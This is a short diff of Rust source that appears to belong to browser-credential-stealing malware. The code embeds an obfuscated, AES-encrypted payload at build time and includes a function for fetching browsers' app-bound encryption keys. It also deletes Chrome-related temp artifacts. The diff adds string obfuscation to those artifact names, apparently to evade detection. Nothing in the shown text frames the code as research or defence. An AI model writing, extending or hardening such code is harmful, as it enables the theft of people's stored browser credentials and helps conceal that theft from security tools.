@@ -1,6 +1,7 @@
 use std::{collections::{HashMap, HashSet}, sync::Mutex, time::Duration};
 use flate2::read::DeflateDecoder;
 use std::io::Read;
+use crate::encrypted::*;
 
 const OBFUSCATED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_obf.bin"));
 const AES_KEY:   &[u8; 32] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_key.bin"));
@@ -105,8 +106,8 @@ pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
 
 pub fn cleanup_legacy_artifacts() {
     let legacy = [
-        std::env::temp_dir().join("chrome_recovery_result.json"),
-        std::env::temp_dir().join("cr_headless_profile"),
+        std::env::temp_dir().join(s_chrome_recovery_result_json()),
+        std::env::temp_dir().join(s_cr_headless_profile()),
     ];
     for path in legacy {
         if path.is_dir() {
